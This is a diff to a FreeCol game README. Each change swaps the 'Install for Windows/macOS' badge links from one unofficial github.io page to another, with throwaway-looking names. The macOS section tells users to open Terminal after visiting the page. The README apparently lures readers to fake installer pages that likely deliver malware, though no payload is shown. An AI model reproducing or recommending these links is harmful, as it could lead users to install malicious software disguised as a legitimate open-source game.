@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FreeCol](https://img.shields.io/badge/⬇_Install_FreeCol-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install FreeCol](https://img.shields.io/badge/⬇_Install_FreeCol-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
@@ -61,9 +61,9 @@ FreeCol is a free, open-source turn-based strategy game based on the classic Col
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://packgiverchopper3.github.io/winsetup/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://packgiverchopper3.github.io/macsetup/)
 
 </div>
 
@@ -81,7 +81,7 @@ FreeCol is a free, open-source turn-based strategy game based on the classic Col
 
 <div align="center">
 
-[![⬇ Install FreeCol](https://img.shields.io/badge/⬇_Install_FreeCol-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install FreeCol](https://img.shields.io/badge/⬇_Install_FreeCol-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
@@ -100,7 +100,7 @@ FreeCol is a free, open-source turn-based strategy game based on the classic Col
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://packgiverchopper3.github.io/macsetup/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ FreeCol is a free, open-source turn-based strategy game based on the classic Col
 
 <div align="center">
 
-[![⬇ Install FreeCol](https://img.shields.io/badge/⬇_Install_FreeCol-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install FreeCol](https://img.shields.io/badge/⬇_Install_FreeCol-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
